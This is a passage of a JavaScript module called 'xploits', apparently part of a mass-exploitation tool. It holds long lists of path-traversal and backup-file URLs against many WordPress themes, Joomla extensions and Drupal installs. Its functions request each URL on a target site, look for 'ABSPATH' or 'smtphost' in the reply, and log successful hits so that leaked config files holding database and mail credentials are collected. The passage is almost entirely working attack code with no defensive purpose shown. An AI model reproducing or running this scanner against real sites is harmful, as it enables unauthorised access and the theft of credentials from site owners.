'/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php', '/wp-content/themes/corporate_works/downloader.php?file_download=../../wp-config.php', '/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php', '/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php', '/wp-content/themes/tess/download.php?file=../../../wp-config.php', '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php', '/wp-content/themes/yakimabait/download.php?file=../../../wp-config.php', '/wp-content/themes/ypo-theme/download.php?download=../../../../wp-config.php', '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php', '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php', '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../wp-config.php', '/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php', '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php', '/wp-content/themes/lote27/download.php?download=../../../wp-config.php', '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php', '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php', '/wp-content/themes/SMWF/inc/download.php?file=../../../../wp-config.php', '/wp-content/themes/persuasion/lib/scripts/dl-skin.php', '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php', '/wp-content/themes/FR0_theme/down.php?path=../../../wp-config.php'];
            await links.forEach(async function (xploiturl) {
                global.sleep(500)
                try {
                    var text1 = await global.requestget(url + xploiturl)
                    if (text1.indexOf("ABSPATH") > -1 ) {
                        log('[WordPress]: Config ConfigGlobalArray Success'+': '+url+xploiturl,3,true)
                        global.Savelogs(url + xploiturl,'WordPressConfig')
                        resolve(true);
                    } else {
                        log('[WordPress]: Config ConfigGlobalArray Failed',2)
                    }
                } catch(e) {
                    
                }
            })
            log('[WordPress]: Config ConfigGlobalArray Failed',2)
            resolve(false);
        });
    }

    async  check_STMPGlobalArray(url) {
        return new Promise(async function(resolve, reject){
            var links = ['/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php','/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php','/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=','/index.php?jat3action=gzip&type=css&file=configuration.php','/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php','/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1','/index.php?option=com_cckjseblod&task=download&file=configuration.php','/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php','/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0','/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes','/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=','/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php','/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php','/index.php?option=com_macgallery&view=download&albumid=../../configuration.php','/sites/default/settings','/sites/default/settings.php~','/sites/default/settings.php.txt','/sites/default/settings.php.old','/sites/default/settings.php_old','/sites/default/settings.php-old','/sites/default/settings.php.save','/sites/default/settings.php.swp','/sites/default/settings.php.swo','/sites/default/settings.php_bak','/sites/default/settings.php-bak','/sites/default/settings.php.original','/sites/default/settings.php.orig','/sites/default/settings.php.bak','/sites/default/settings.save','/sites/default/settings.old','/sites/default/settings.bak','/sites/default/settings.orig','/sites/default/settings.original','/sites/default/settings.txt','/wp-config.php.save','/wp-config.php~','/wp-config.php.swo','/wp-config.php.swp'];
            await links.forEach(async function (xploiturl) {
                global.sleep(500)
                try {
                    var text1 = await global.requestget(url + xploiturl)
                    if (text1.indexOf("smtphost") > -1 ||  text1.indexOf("ABSPATH") > -1 ) {
                        log('[WordPress]: Config STMPGlobalArray Success'+': '+url+xploiturl,3,true)
                        global.Savelogs(url + xploiturl,'WordPressConfig')
                        resolve(true);
                    } else {
                        log('[WordPress]: Config STMPGlobalArray Failed',2)
                    }
                } catch(e) {
                    
                }
            })
            log('[WordPress]: Config STMPGlobalArray Failed',2)
            resolve(false);
        });
    }
}

module.exports = new xploits();